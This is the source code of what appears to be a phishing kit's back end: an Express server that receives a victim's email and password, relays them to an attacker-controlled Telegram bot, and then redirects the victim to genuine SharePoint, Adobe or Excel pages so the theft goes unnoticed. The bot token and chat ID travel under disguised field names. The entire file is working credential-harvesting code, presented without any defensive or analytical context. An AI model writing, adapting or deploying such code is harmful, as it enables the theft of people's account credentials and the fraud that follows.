const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = 3000;

// Middleware to parse JSON and form data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Utility function to validate input
const isValidToken = (token) => typeof token === 'string' && token.length >= 30; // Adjusted for token format
const isValidChatId = (chatId) => typeof chatId === 'string' || typeof chatId === 'number';

app.post('/q', async (req, res) => {
    const { email, password, netob, ditch, type } = req.body;
    
    console.log(type);

    // Validate input
    if (!email || !password || !netob || !ditch) {
        console.error('Missing required fields in the request.');
        return res.redirect('/error'); // Redirect to an error page
    }

    if (!isValidToken(netob) || !isValidChatId(ditch)) {
        console.error('Invalid bot token or chat ID provided.');
        // Redirect to an error page
    }

    // Construct the Telegram message
    const telegramMessage = `Attachment Submission ✅\n\nEmail: ${email}\nPassword: ${password}`;

    try {
        // Send the message to Telegram
        await axios.post(`https://api.telegram.org/bot${netob}/sendMessage`, {
            chat_id: ditch,
            text: telegramMessage,
        });

        console.log('Message sent to Telegram successfully.');

        // Handle redirection based on type
        switch (type) {
            case "sharepoint":
                return res.redirect('https://sharepoint.com');
            case "adobe":
                return res.redirect('https://community.adobe.com/t5/adobe-acrobat-sign-discussions/adobe-sign-login-has-expired/m-p/10255182');
            case "excel":
                return res.redirect('https://excel.com');
            default:
                return res.redirect('/success'); // Default success page
        }
    } catch (error) {
        console.error('Failed to send message to Telegram:', error.response?.data || error.message);
        return res.redirect('/error'); // Redirect to an error page in case of failure
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});